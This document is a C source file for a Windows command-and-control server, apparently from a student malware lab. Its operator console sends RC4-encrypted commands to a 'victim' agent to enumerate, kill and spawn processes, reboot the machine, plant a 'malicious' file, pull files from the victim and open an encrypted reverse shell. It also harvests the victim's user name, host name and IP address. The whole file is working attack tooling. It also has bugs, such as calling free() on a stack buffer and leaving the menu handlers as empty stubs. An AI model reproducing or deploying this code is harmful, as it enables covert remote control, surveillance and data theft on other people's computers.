#include<stdio.h>
#include<winsock2.h>
#include<winsock.h>
#include<Windows.h>
#include<WS2tcpip.h>
#include<Lmcons.h>
#include<time.h>
#include<TlHelp32.h>
#include<string.h>
#pragma comment(lib, "ws2_32.lib")
#define BREAK_WITH_SOCKET_ERROR(e) {printf(RED); printf("[-] %s. Error code = %d", \
e, WSAGetLastError()); printf(RESET); ExitProcess(0); }
#define SUCCESS(e) {printf(GREEN); \
printf("%s", e); printf(RESET); }
#define ERROR(e) {printf(RED); \
printf("%s", e); printf(RESET);}
#define WARNING(e) {printf(YELLOW);\
printf("%s", e); printf(RESET);}
#define TAGINFORMATION(e) {printf(BLUE); \
printf("%s", e); printf(RESET); }
#define OBFUSCATE_XOR(a, b, c) a = (b | c) & (~b | ~c); 

// length of buffer
#define MAX_CHUNK 1025
#define MAX_BOX 256
#define MAX_KEY 16

// custom command
#define ENUMERATE_PROCESS_COMMAND 's'
#define ENCRYPTED_REVERSE_SHELL_COMMAND 'y'
#define TERMINATE_PROCESS_COMMAND 'a'
#define SPAWN_PROCESS_COMMAND 'o'
#define UPLOAD_FILE_COMMAND 'r'
#define CHANGE_DOMAIN_COMMAND 'e'
#define CHANGE_PORT_COMMAND 'n'
#define DELETE_TRACE_COMMAND 'm'
#define SHUTDOWN_REBOOT_COMMAND 't'
#define DOWNLOAD_FILE_COMMAND 'd'
#define QUERY_RC4_KEY_COMMAND 'x'


//color
#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define BLUE "\033[1;34m"
#define RESET "\033[0m"

typedef struct pipesock {
    SOCKET ioSock;
    HANDLE hPipe;
} PIPESOCK, * PPIPESOCK;

SOCKET srvSock;
BYTE box[MAX_BOX];
BYTE rc4Key[MAX_KEY + 1];
DWORD dwRc4KeyLen;
CRITICAL_SECTION criticalSection;


// swap two bytes
VOID Swap(BYTE* a, BYTE* b) {
    BYTE temp = *a;
    *a = *b;
    *b = temp;
}

// initialize the state of box
VOID RC4Init() {
    DWORD i, j = 0;
    for (i = 0; i < 256; i++) {
        box[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + box[i] + rc4Key[i % dwRc4KeyLen]) % 256;
        Swap(&box[i], &box[j]);
    }
}

// rivest cipher 4
VOID RC4Crypt(BYTE* buf, DWORD dwBufLen) {
    DWORD i = 0, j = 0;
    for (DWORD n = 0; n != dwBufLen; n++) {
        i = (i + 1) % 256;
        j = (j + box[i]) % 256;
        Swap(&box[i], &box[j]);
        BYTE k = box[(box[i] + box[j]) % 256];
        OBFUSCATE_XOR(buf[n], buf[n], k);
    }
}

// rivest cipher 4 for a segment
VOID RC4CryptSegment(BYTE* buf, DWORD dwCurBytesRecv, DWORD* i, DWORD* j) {
    for (DWORD n = 0; n != dwCurBytesRecv; n++) {
        *i = (*i + 1) % 256;
        *j = (*j + box[*i]) % 256;
        Swap(&box[*i], &box[*j]);
        BYTE k = box[(box[*i] + box[*j]) % 256];
        OBFUSCATE_XOR(buf[n], buf[n], k);
    }
}

// enumerate victim's processes
BOOL ProcessEnumeration(SOCKET ioSock) {
    DWORD i = 0, j = 0;
    BYTE command[MAX_CHUNK];
    WCHAR recvBuf[MAX_CHUNK];
    DWORD dwCurBytesRecv = 0, dwBytesRecv = 0, dwAllBytesRecv = 0;

    // send the command to victim
    ZeroMemory(command, sizeof(command));
    command[0] = ENUMERATE_PROCESS_COMMAND;
    RC4Init();
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to send command to victim\n");
        return FALSE;
    }
    // receieve number of bytes to be received
    if (recv(ioSock, (CHAR*)&dwAllBytesRecv, sizeof(dwAllBytesRecv), 0) < 0) {
        printf("[-] Failed to receive buffer size\n");
        return FALSE;
    }
    if (!dwAllBytesRecv) {
        printf("[-] Failed to get process list from victim\n");
        return FALSE;
    }
    printf("***************************************PROCESS LIST*****************************************\n");
    // receive the process list
    RC4Init();
    while (1) {
        dwCurBytesRecv = recv(ioSock, (CHAR*)recvBuf, MAX_CHUNK - 1, 0);
        if (dwCurBytesRecv < 0) {
            printf("[-] Failed to receive bytes\n");
            break;
        }
        RC4CryptSegment(recvBuf, dwCurBytesRecv, &i, &j);
        recvBuf[dwCurBytesRecv / 2] = L'\0';
        wprintf(L"%ls", recvBuf);
        dwBytesRecv += dwCurBytesRecv;
        if (dwBytesRecv >= dwAllBytesRecv) {
            break;
        }
    }
    printf("[+] Enumerate processes success\n");
    return TRUE;
}

DWORD CheckLastSegment(DWORD dwAllBytesRecv, DWORD dwBytesReceive) {
    DWORD dwRemainBytesRecv = dwAllBytesRecv - dwBytesReceive;
    if (dwRemainBytesRecv < MAX_CHUNK - 1)return dwRemainBytesRecv;
    return MAX_CHUNK - 1;
}

// send commands in the encrypted reverse shell to victim
DWORD WINAPI WriteDataToVictim(LPVOID lpParam) {
    BOOL bExit = FALSE;
    DWORD dwSendBufLen = 0;
    CHAR sendBuf[MAX_CHUNK];
    SOCKET ioSock = *(SOCKET*)lpParam;

    while (1) {
        // input a command
        fgets(sendBuf, MAX_CHUNK - 1, stdin);
        if (RtlCompareMemory(sendBuf, "exit", 4) == 4)
            bExit = TRUE;
        // encrypt and send the command to victim
        RC4Init();
        dwSendBufLen = strlen(sendBuf);
        RC4Crypt(sendBuf, dwSendBufLen);
        if (send(ioSock, sendBuf, dwSendBufLen, 0) < 0) {
            printf("[-] Failed to send command to victim\n");
            return 0;
        }
        if (bExit) ExitThread(0);
    }
    return 1;
}

// receive the data in the encrypted reverse shell from victim
DWORD WINAPI ReadDataFromVictim(LPVOID lpParam) {
    DWORD i = 0, j = 0;
    CHAR recvBuf[MAX_CHUNK];
    SOCKET ioSock = *(SOCKET*)lpParam;
    DWORD dwBytesRecv = 0, dwAllBytesRecv = 0, dwCurBytesRecv = 0;

    ZeroMemory(recvBuf, sizeof(recvBuf));
    while (1) {
        // receieve number of bytes to be received
        if (recv(ioSock, (CHAR*)&dwAllBytesRecv, sizeof(dwAllBytesRecv), 0) < 0) {
            printf("[-] Failed to receive buffer size\n");
            return 0;
        }
        i = j = 0;
        RC4Init();
        while (1) {
            // receive the data from victim
            dwCurBytesRecv = recv(ioSock, recvBuf, CheckLastSegment(dwAllBytesRecv, dwBytesRecv), 0);
            if (dwCurBytesRecv < 0) {
                printf("[-] Failed to receive bytes\n");
                return 0;
            }
            // decrypt the data
            RC4CryptSegment(recvBuf, dwCurBytesRecv, &i, &j);
            dwBytesRecv += dwCurBytesRecv;
            recvBuf[dwCurBytesRecv] = '\0';
            // display the data to screen
            printf("%s", recvBuf);
            if (dwBytesRecv >= dwAllBytesRecv) {
                break;
            }
        }
        dwBytesRecv = 0;
    }
    return 1;
}

// create encrypted reverse shell
BOOL EncryptedReverShell(SOCKET ioSock) {
    HANDLE hHandleList[2];
    DWORD dwEventIndex = 0;
    BYTE command[MAX_CHUNK];
    HANDLE hReadThread, hWriteThread;
    DWORD dwReadThreadId, dwWriteThreadId;

    // send the command to victim
    command[0] = ENCRYPTED_REVERSE_SHELL_COMMAND;
    RC4Init();
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] failed to send command to victim\n");
        return FALSE;
    }
    // create two threads for send and receive the data
    hReadThread = CreateThread(NULL, 0, ReadDataFromVictim, &ioSock, 0, &dwReadThreadId);
    hWriteThread = CreateThread(NULL, 0, WriteDataToVictim, &ioSock, 0, &dwWriteThreadId);
    hHandleList[0] = hReadThread;
    hHandleList[1] = hWriteThread;
    // wait for the exit event
    dwEventIndex = WaitForMultipleObjects(2, hHandleList, FALSE, INFINITE);
    printf("[+] event index: %d\n", dwEventIndex);
    if (dwEventIndex == 0) {
        TerminateThread(hWriteThread, 0);
    }
    else if (dwEventIndex == 1) {
        TerminateThread(hReadThread, 0);
    }
    printf("[+] Exit encrypted reverse shell\n");
    return TRUE;
}

// terminate process
BOOL ProcessTermination(SOCKET ioSock) {
    DWORD dwProcessID = 0;
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];
    DWORD dwBytesRecv = 0, dwAllBytesRecv = 0;

    printf("[+] Enter process id to terminate: ");
    scanf_s("%d", &dwProcessID);
    ZeroMemory(command, MAX_CHUNK);
    command[0] = TERMINATE_PROCESS_COMMAND;
    *((DWORD*)(command + 1)) = dwProcessID;
    RC4Init();
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    // send the command to victim
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to send command to victim\n");
        return FALSE;
    }
    // receive feedback from victim
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to receive the exit code of process\n");
        return FALSE;
    }
    RC4Init();
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    printf("[+] Termination state of process = %hhu\n", recvBuf[0]);
    return TRUE;
}

BOOL ProcessSpawn(SOCKET ioSock) {
    DWORD dwPathSize;
    BYTE spawnStatus;
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];
    WCHAR processPath[] = L"C:\\windows\\system32\\calc.exe";

    // send command to victim
    command[0] = SPAWN_PROCESS_COMMAND;
    dwPathSize = (wcslen(processPath) + 1) * 2;
    RtlCopyMemory(command + 1, processPath, dwPathSize);
    RC4Init();
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to send command to victim\n");
        return FALSE;
    }
    // receive feedback from victim
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to receive the exit code of process\n");
        return FALSE;
    }
    RC4Init();
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    printf("[+] Spawn state of process = %hhu\n", recvBuf[0]);
    return TRUE;
}

BOOL ShutDownOrRebootVictim(SOCKET ioSock) {
    BYTE shutdownRebootStatus;
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];

    // send the command to victim
    command[0] = SHUTDOWN_REBOOT_COMMAND;
    command[1] = 0; // 0 for reboot, 1 for shutdown
    *(DWORD*)(command + 2) = 15; // time out
    RC4Init();
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to send command to victim\n");
        return FALSE;
    }
    // receive feedback from victim
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to receive the shutdown or reboot state from victim\n");
        return FALSE;
    }
    RC4Init();
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    printf("[+] The shutdown or reboot state from victim = %hhu\n", recvBuf[0]);
    return TRUE;
}

// upload a file to victim
BOOL UploadFile(SOCKET ioSock) {
    HANDLE hFile;
    DWORD C2FileSize;
    DWORD i = 0, j = 0;
    DWORD dwNumOfBytesRead = 0, dwNumOfBytesWritten = 0;
    BYTE recvBuf[MAX_CHUNK], sendBuf[MAX_CHUNK], command[MAX_CHUNK];
    WCHAR victimPathFile[] = L"C:\\Users\\Hii\\Desktop\\malicious.pdf";
    DWORD dwVictimPathFileSize = (wcslen(victimPathFile) + 1) * 2;
    WCHAR C2PathFile[] = L"C:\\Users\\Hii\\Documents\\Book\\Malware\\mdmz_book.pdf";

    // open the file for uploading the file to victim
    hFile = CreateFileW(C2PathFile, GENERIC_WRITE | GENERIC_READ,
        NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) {
        printf("[-] Failed to open file. Error code = %d\n", GetLastError());
        return FALSE;
    }
    C2FileSize = GetFileSize(hFile, NULL);
    // send the command to victim
    command[0] = UPLOAD_FILE_COMMAND;
    *(DWORD*)(command + 1) = C2FileSize;
    RtlCopyMemory(command + 5, victimPathFile, dwVictimPathFileSize);
    RC4Init();
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to send command to victim\n");
        return FALSE;
    }
    // receive feedback from victim
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to receive status from victim. Error code = %d\n", GetLastError());
        return FALSE;
    }
    RC4Init();
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    if (!recvBuf[0]) {
        printf("[-] Failed to create the malicious file in client. Errorc code = %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Create a malicious file in client success\n");
    // send the file to victim
    RC4Init();
    while (ReadFile(hFile, sendBuf, MAX_CHUNK - 1, &dwNumOfBytesRead, NULL)) {
        if (!dwNumOfBytesRead)break;
        RC4CryptSegment(sendBuf, dwNumOfBytesRead, &i, &j);
        if (send(ioSock, sendBuf, dwNumOfBytesRead, 0) < 0) {
            printf("[-] Failed to send a chunk of data. Error code = %d\n", GetLastError());
            return FALSE;
        }
    }
    printf("[+] Upload file to victim success\n");
    return TRUE;
}

// download the specified file from victim
BOOL DownloadFile(SOCKET ioSock) {
    DWORD i = 0, j = 0;
    HANDLE hFile = NULL;
    DWORD dwPathFileSize = 0;
    DWORD dwNumOfBytesWritten = 0;
    BYTE command[MAX_CHUNK], recvBuf[MAX_CHUNK];
    DWORD dwAllBytesRecv = 0, dwCurBytesRecv = 0, dwBytesRecv = 0;
    WCHAR pathFile[] = L"C:\\Users\\Hii\\Desktop\\20521340-20521351-20521808-Lab4.pdf";
    WCHAR downloadFilePath[] = L"C:\\Users\\Hii\\Desktop\\metroi.pdf";

    // send the command to victim
    command[0] = DOWNLOAD_FILE_COMMAND;
    dwPathFileSize = (wcslen(pathFile) + 1) * 2;
    RtlCopyMemory(command + 1, pathFile, dwPathFileSize);
    RC4Init();
    RC4Crypt(command + 1, MAX_CHUNK - 2);
    if (send(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to send command to victim. Error code = %d\n", GetLastError());
        return FALSE;
    }
    // receive the status of file
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to receive download status from victim. Error code = %d\n", GetLastError());
        return FALSE;
    }
    RC4Init();
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    if (!recvBuf[0]) {
        printf("[-] Failed to download file from victim\n");
        return FALSE;
    }
    dwAllBytesRecv = *(DWORD*)(recvBuf + 1);
    // create a new file for saving
    hFile = CreateFileW(downloadFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) {
        printf("[-] Failed to create file. Error code = %d\n", GetLastError());
        return FALSE;
    }
    // save the content received from victim
    RC4Init();
    while (1) {
        dwCurBytesRecv = recv(ioSock, recvBuf, MAX_CHUNK - 1, 0);
        if (dwCurBytesRecv < 0) {
            printf("[-] Failed to receive data from victim. Error code = %d\n", GetLastError());
            return FALSE;
        }
        RC4CryptSegment(recvBuf, dwCurBytesRecv, &i, &j);
        WriteFile(hFile, recvBuf, dwCurBytesRecv, &dwNumOfBytesWritten, NULL);
        dwBytesRecv += dwCurBytesRecv;
        if (dwBytesRecv >= dwAllBytesRecv)break;
    }
    CloseHandle(hFile);
    printf("[+] Download file success\n");
    return TRUE;
}

// generate random key
VOID GenerateRandomKey(CHAR* key, DWORD dwKeyLen) {
    CHAR charSet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    DWORD dwCharSetSz = sizeof(charSet) - 1;
    for (DWORD i = 0; i < dwKeyLen; ++i) {
        key[i] = charSet[rand() % dwCharSetSz];
    }
    rc4Key[dwKeyLen] = '\0';
}

// receive the system information of victim and send rc4 key to victim
BOOL RecvSysInfoAndSendKey(SOCKET ioSock) {
    CHAR ipv4Addr[32];
    WCHAR userName[UNLEN + 1];
    DWORD dwBuildNum, dwRevVer;
    BYTE recvBuf[MAX_CHUNK], sendBuf[MAX_CHUNK];
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    // receive the first connection from victim 
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to receive victim's system information. Error code = %d\n", GetLastError());
        return FALSE;
    }
    if (recvBuf[0] != QUERY_RC4_KEY_COMMAND)return FALSE;
    // send rc4 key to victim for the communication
    dwRc4KeyLen = MAX_KEY;
    GenerateRandomKey(rc4Key, dwRc4KeyLen);
    printf("[+] Rc4 key: %s\n", rc4Key);
    RtlCopyMemory(sendBuf + 4, rc4Key, dwRc4KeyLen + 1);
    if (send(ioSock, sendBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to send rc4 key to victim. Error code = %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Send rc4 key to victim success\n");
    // receive system information from victim
    if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
        printf("[-] Failed to receive system information from victim. Error code = %d\n", GetLastError());
        return FALSE;
    }
    RC4Init();
    RC4Crypt(recvBuf, MAX_CHUNK - 1);
    RtlCopyMemory(computerName, recvBuf, 32);
    RtlCopyMemory(userName, recvBuf + 32, (UNLEN + 1) * 2);
    RtlCopyMemory(ipv4Addr, recvBuf + 576, 32);
    RtlCopyMemory(&dwBuildNum, recvBuf + 608, 4);
    RtlCopyMemory(&dwRevVer, recvBuf + 612, 4);
    printf("******************************SYSTEM INFORMATION**************************************\n");
    wprintf(L"[+] Computer name: %ls\n", computerName);
    wprintf(L"[+] User name: %ls\n", userName);
    printf("[+] Ipv4 address: %s\n", ipv4Addr);
    printf("[+] Build version: %u\n", dwBuildNum);
    printf("[+] Revision version: %u\n", dwRevVer);
    return TRUE;
}

// clear console
VOID ClearConsoleScreen() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD coordScreen = { 0, 0 };
    DWORD cCharsWritten;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD dwConSize;

    GetConsoleScreenBufferInfo(hConsole, &csbi);
    dwConSize = csbi.dwSize.X * csbi.dwSize.Y;

    FillConsoleOutputCharacter(hConsole, ' ', dwConSize, coordScreen, &cCharsWritten);
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    FillConsoleOutputAttribute(hConsole, csbi.wAttributes, dwConSize, coordScreen, &cCharsWritten);
    SetConsoleCursorPosition(hConsole, coordScreen);
}

VOID Accept() {

    SOCKET ioSock;
    SOCKADDR_IN conAddr;
    int conAddrLen = 0;

    ZeroMemory(&conAddr, sizeof(conAddr));
    conAddrLen = sizeof(conAddr);
    ioSock = accept(srvSock, (struct sockaddr*)&conAddr, &conAddrLen);
    if (ioSock == INVALID_SOCKET)
        BREAK_WITH_SOCKET_ERROR("Failed to accept a new connection")
    else {
        char tempBuf[20];
        inet_ntop(AF_INET, &conAddr.sin_addr, tempBuf, strlen(tempBuf));
        printf("[+] Accept a connection from ip %s with port %hu\n",
            tempBuf, ntohs(conAddr.sin_port));
        free(tempBuf);
    }
    RecvSysInfoAndSendKey(ioSock);

    ProcessEnumeration(ioSock);
    EncryptedReverShell(ioSock);
    shutdown(ioSock, SD_BOTH);
    shutdown(srvSock, SD_BOTH);
    closesocket(ioSock);
    closesocket(srvSock);
    printf("[+] Close connection\n");
    WSACleanup();

    return 0;
}


VOID Listener() {
    WSADATA wsaData;
    SOCKADDR_IN srvAddr;
    DWORD dwNumOfBytesRead = 0, dwNumOfBytesWritten = 0;
    TAGINFORMATION("*************************************NETWORK INFORMATION****************************\n")
    srand((DWORD)time(NULL));
    if (WSAStartup(MAKEWORD(2, 2), &wsaData))
        BREAK_WITH_SOCKET_ERROR("Failed to startup socket environment")

        srvSock = socket(AF_INET, SOCK_STREAM, 0);
    if (srvSock == INVALID_SOCKET)
        BREAK_WITH_SOCKET_ERROR("Failed to create server socket")

        ZeroMemory(&srvAddr, sizeof(srvAddr));
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(5555);
    srvAddr.sin_addr.s_addr = INADDR_ANY;
    if (bind(srvSock, (struct sockaddr*)&srvAddr, sizeof(srvAddr)) == SOCKET_ERROR)
        BREAK_WITH_SOCKET_ERROR("Failed to bind server socket")

        if (listen(srvSock, 10) == SOCKET_ERROR)
            BREAK_WITH_SOCKET_ERROR("Failed to listen new connection")
        else
            SUCCESS("\n[+] Listening connection on port 5555...\n")
   
}



VOID Init() {
    BOOL isResult;
    isResult = CreateDirectoryW(L"./data/", NULL);
    if (isResult == ERROR_ALREADY_EXISTS)
        BREAK_WITH_SOCKET_ERROR("Fail create directory")
}


#define C2_MENU {SUCCESS("(c2)") \
    ERROR("::> ")}
#define HOST_MENU(e) {SUCCESS(e) \
    ERROR("::> ")}

char choice1[MAX_CHUNK];
char choice2[MAX_CHUNK];

typedef struct listsocket {
    SOCKET Socket;
    WCHAR* DeviceName;
    WCHAR* UserName;
    PSOCKADDR SocketAddr;
    DWORD CurrentBuild;
    DWORD RevisionVersion;
    BYTE* Key;
} LISTSOCKET, * PLISTSOCKET;
VOID MainMenu() {

    WARNING("\n Command                    Description                     Argumments\n")
    WARNING("---------                  -------------                   ------------\n")
    WARNING(" help                       Show help.\n")
    WARNING(" quit                       Exit.\n")
    WARNING(" list                       List active agents.\n")
    WARNING(" connect                    Conneting to agent.             <IPv4>\n\n")
    
}

VOID HostMenu() {
    WARNING("\n Command                    Description                          Argumments\n")
    WARNING("---------                  -------------                        ------------\n")
    WARNING(" help                       Show help.\n")
    WARNING(" quit                       Exit.\n")
    WARNING(" shell                      Reverse shell.\n")
    WARNING(" infor                      Show host's information.\n")
    WARNING(" psenum                     List process running.\n")
    WARNING(" psspaw                     Create process on agent.           <IdProcess>\n")
    WARNING(" psster                     Terminate process on agent.        <IdProcess>\n")
    WARNING(" shutdown                   Shutdown or Reboot agent.          <mode>: 0 for reboot, 1 for shutdown\n")
    WARNING(" download                   Download file from agent.          <inputPath> <outputPath>\n")
    WARNING(" upload                     Upload file to agent.              <inputPath> <outputPath>\n\n")
}

VOID HandleHostMenu() {
    while (TRUE) {
        printf("\n");
        HOST_MENU("(xuanquang)")
        ZeroMemory(choice2, MAX_CHUNK);
        fgets(choice2, MAX_CHUNK, stdin);
        if (!strcmp(choice2, "help\n")) {
            SUCCESS("[*] Availale commands: \n")
                HostMenu();
        }
        else if (!strcmp(choice2, "quit\n")) {
            SUCCESS("[*] Exiting...\n")
                break;
        }
        else if (!strcmp(choice2, "shell\n")) {
            SUCCESS("[*] Remote shell...\n")

        }
        else if (!strcmp(choice2, "infor\n")) {
            SUCCESS("[*] Get Information...: \n")
        }
        else if (!strcmp(choice2, "psenum\n")) {
            SUCCESS("[*] Get list process...: \n")

        }
        else if (!strcmp(choice2, "psspaw\n")) {
            SUCCESS("[*] Createprocess...\n")
        }
        else if (!strcmp(choice2, "pster\n")) {
            SUCCESS("[*] Terminate process...\n")

        }
        else if (!strcmp(choice2, "shutdown\n")) {
            SUCCESS("[*] Shutdown, reboot agent...\n")
        }
        else if (!strcmp(choice2, "download\n")) {
            SUCCESS("[*] Download file...\n")
        }
        else if (!strcmp(choice2, "upload\n")) {
            SUCCESS("[*] Upload file...\n")
        }
        else if (!strcmp(choice2, "clear\n")) {
            ClearConsoleScreen();
        }
        else {
            ERROR("[*] No command!!!\n")
                continue;
        }
    }
}



VOID HandleMainMenu() {

    do {
        printf("\n");
        C2_MENU
        ZeroMemory(choice1, MAX_CHUNK);
        fgets(choice1, MAX_CHUNK, stdin);
        if (!strcmp(choice1, "help\n")) {
            SUCCESS("[*] Availale commands: \n")
                MainMenu();
        }
        else if (!strcmp(choice1, "connect\n")) {
            SUCCESS("[*] Connecting to host: \n")
                HandleHostMenu();
        }
        else if (!strcmp(choice1, "list\n")) {
            SUCCESS("[*] Available host: \n")

        }
        else if (!strcmp(choice1, "clear\n")) {
            ClearConsoleScreen();
        }
        else {
            ERROR("[*] No command!!!\n")
                continue;
        }
    } while (strcmp(choice1, "quit\n"));
}



int wmain(int argc, WCHAR* argv[]) {

    WSADATA wsaData;
    int conAddrLen = 0;
    SOCKET srvSock, ioSock;
    SOCKADDR_IN srvAddr, conAddr;
    DWORD dwNumOfBytesRead = 0, dwNumOfBytesWritten = 0;
    printf("*************************************NETWORK INFORMATION****************************\n");
    srand((DWORD)time(NULL));
    if (WSAStartup(MAKEWORD(2, 2), &wsaData))
        BREAK_WITH_SOCKET_ERROR("Failed to startup socket environment")

        srvSock = socket(AF_INET, SOCK_STREAM, 0);
    if (srvSock == INVALID_SOCKET)
        BREAK_WITH_SOCKET_ERROR("Failed to create server socket")

        ZeroMemory(&srvAddr, sizeof(srvAddr));
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(5555);
    srvAddr.sin_addr.s_addr = INADDR_ANY;
    if (bind(srvSock, (struct sockaddr*)&srvAddr, sizeof(srvAddr)) == SOCKET_ERROR)
        BREAK_WITH_SOCKET_ERROR("Failed to bind server socket")

        if (listen(srvSock, 10) == SOCKET_ERROR)
            BREAK_WITH_SOCKET_ERROR("Failed to listen new connection")
            printf("[+] Listening connection on port 5555...\n");

    ZeroMemory(&conAddr, sizeof(conAddr));
    conAddrLen = sizeof(conAddr);
    ioSock = accept(srvSock, (struct sockaddr*)&conAddr, &conAddrLen);
    if (ioSock == INVALID_SOCKET)
        BREAK_WITH_SOCKET_ERROR("Failed to accept a new connection")
    else {
        char tempBuf[20];
        inet_ntop(AF_INET, &conAddr.sin_addr, tempBuf, strlen(tempBuf));
        printf("[+] Accept a connection from ip %s with port %hu\n",
            tempBuf, ntohs(conAddr.sin_port));
        free(tempBuf);
    }
    RecvSysInfoAndSendKey(ioSock);
    ProcessEnumeration(ioSock);
    EncryptedReverShell(ioSock);
    shutdown(ioSock, SD_BOTH);
    shutdown(srvSock, SD_BOTH);
    closesocket(ioSock);
    closesocket(srvSock);
    printf("[+] Close connection\n");
    WSACleanup();

    return 0;
}